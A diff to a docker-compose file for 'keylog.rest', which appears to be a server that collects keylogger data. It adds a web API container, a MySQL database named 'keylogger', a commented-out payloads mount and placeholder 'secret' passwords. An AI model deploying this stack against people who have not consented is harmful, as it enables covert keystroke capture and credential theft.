@@ -1,10 +1,27 @@
 version: '3'
 
 services:
-  keylog.rest:
+  web-api:
     image: kroelld/keylog.rest
-    build: .
+    container_name: keylog.rest-api
+    restart: always
     environment:
       NODE_ENV: production
     ports:
       - 3000:3000
+    links:
+      - mysql
+    volumes:
+      - "./config.example.docker.js:/usr/src/app/config.js:ro" # customize
+      # - "/path/to/payloads:/usr/src/app:ro"
+    depends_on:
+      - "mysql"
+  mysql:
+    image: mysql
+    container_name: keylog.rest-db
+    restart: always
+    environment: ### customize
+      MYSQL_ROOT_PASSWORD: "secret"
+      MYSQL_DATABASE: "keylogger"
+      MYSQL_USER: "keylog_user"
+      MYSQL_PASSWORD: "secret"
